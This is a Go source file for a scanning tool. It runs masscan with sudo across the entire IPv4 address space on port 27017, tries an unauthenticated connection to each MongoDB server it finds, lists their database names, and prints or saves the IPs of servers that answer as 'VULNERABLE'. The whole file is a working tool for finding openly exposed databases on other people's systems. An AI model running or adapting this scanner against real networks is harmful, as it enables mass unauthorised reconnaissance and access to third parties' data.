package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"

	"github.com/mongodb/mongo-go-driver/bson"
	"github.com/mongodb/mongo-go-driver/mongo"
	"github.com/pkg/profile"
)

var maxPtr *string
var outFile *string
var verbose *bool

func main() {
	defer profile.Start(profile.MemProfile).Stop()
	ipAddr := make(chan string)
	data := make(chan string)

	masscanInstalled() // Check if masscan binary is installed.
	WelcomeMsg()

	maxPtr = flag.String("max-rate", "100", "Max rate at which packets will be sent")
	outFile = flag.String("out-file", "null", "Name of file to which vulnerable IPs will be exported")
	verbose = flag.Bool("v", false, "Display error msgs from non-vulnerable servers")

	flag.Parse()

	go execMasscan(ipAddr)

	if *outFile != "null" {
		go fileWriter(data)
	}

	workDispatcher(ipAddr, data) // Dont call this func inside execMasscan coz exec.Command is a blocking statement.
}

func execMasscan(ipAddr chan string) {
	cmd := exec.Command("/bin/bash", "-c", "sudo masscan -p27017 0.0.0.0/0 --exclude 255.255.255.255 --open-only --max-rate "+*maxPtr)
	ok, err := cmd.StdoutPipe()

	if err != nil {
		log.Fatalf("could not get stdout pipe: %v", err)
	}

	go func() {
		scanner := bufio.NewScanner(ok)

		for scanner.Scan() {
			msg := scanner.Text()
			ipAddr <- msg
		}
		close(ipAddr)
	}()
	if err := cmd.Run(); err != nil {
		log.Fatalf("could not run cmd: %v", err)
	}
	if err != nil {
		log.Fatalf("could not wait for cmd: %v", err)
	}
}

func workDispatcher(ipAddr chan string, data chan string) {
	print("Started Scannig servers.")
	num := 0
	for value := range ipAddr {
		num++
		print("\rTotal servers with port 27017 open - ", num)
		go testIP(filterIP(value), data)
	}
}

func testIP(input string, data chan string) {

	client, err := mongo.Connect(context.TODO(), "mongodb://"+input+":27017/test")

	if err != nil {
		return
	}

	// Check the connection
	err = client.Ping(context.TODO(), nil)

	//If we can list databases , we can read records to!
	dbs, err := client.ListDatabaseNames(context.TODO(), bson.D{{}})

	if err != nil {
		if *verbose {
			print("\r\033[K" + input + ": ")
			println(err.Error())
		}

	} else {
		println("\r\033[K" + input + " is VULNERABLE:")
		fmt.Printf("%v", dbs)
		println("\n")

		if *outFile != "null" {
			data <- input
		}

	}
	client.Disconnect(context.TODO())
	return
}

func fileWriter(data chan string) {

	for value := range data {

		f, err := os.OpenFile(*outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		defer f.Close()

		if _, err = f.WriteString(value + "\n"); err != nil {
			panic(err)
		}
	}

}
